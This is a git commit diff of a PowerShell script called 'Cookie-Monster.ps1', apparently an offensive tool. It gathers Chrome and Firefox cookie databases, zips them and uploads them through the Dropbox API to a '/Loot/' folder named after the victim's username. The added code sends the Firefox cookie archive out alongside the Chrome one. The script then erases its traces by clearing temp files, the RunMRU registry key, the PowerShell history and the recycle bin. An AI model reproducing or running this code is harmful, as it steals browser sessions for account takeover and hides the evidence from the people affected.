084e1e4ffeaeaa434867155ab22fc48e8d6f1174
0D1NSS0N <115773776+0d1nss0n@users.noreply.github.com>
2023-05-12 08:50:09 -0700

    Update Cookie-Monster.ps1

--- Cookie-Monster.ps1
+++ Cookie-Monster.ps1
@@ -14,6 +14,9 @@ Copy-Item -Path $GcookiesPath -Destination $GfilePath -Force
 $SearchPath = "C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles"
 $FilesToSearch = @("cookies.sqlite", "cookies.sqlite-shm", "cookies.sqlite-wal")
 $TempFolderPath = "$env:tmp\Firefox-Cookies\"
+$firefox_cookies_path = "$env:tmp\Firefox-Cookies.zip"
+$FdestinationPath = "/Loot/$env:USERNAME/Firefox-Cookies.zip"
+
 
 mkdir $env:tmp\Firefox-Cookies
 
@@ -43,6 +46,7 @@ if ($Results) {
 
 Compress-Archive -Path "$env:tmp\Firefox-Cookies" -DestinationPath "$env:tmp\Firefox-Cookies.zip"
 
+
 ------------------------------------------------------------------------------------------------------------------------------------------
 
 try {
@@ -55,15 +59,33 @@ try {
     $fileContent = [System.IO.File]::ReadAllBytes($filePath)
     $url = "https://content.dropboxapi.com/2/files/upload"
 
-    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $filePath -ContentType "application/octet-stream"
+    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $GfilePath -ContentType "application/octet-stream"
 
-    Write-Host "File uploaded to Dropbox successfully."
+    Write-Host "Chrome Cookie Jar uploaded successfully"
 }
 catch {
     Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
 }
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+try {
+    $headers = @{
+        "Authorization" = "Bearer $db"
+        "Content-Type" = "application/octet-stream"
+        "Dropbox-API-Arg" = '{"path": "' + $FdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
+    }
+
+    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+    $url = "https://content.dropboxapi.com/2/files/upload"
+
+    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $firefox_cookies_path -ContentType "application/octet-stream"
+
+    Write-Host "Firefox Cookie Jar uploaded successfully"
+}
+catch {
+    Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
+}
+
+rm $env:tmp\* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
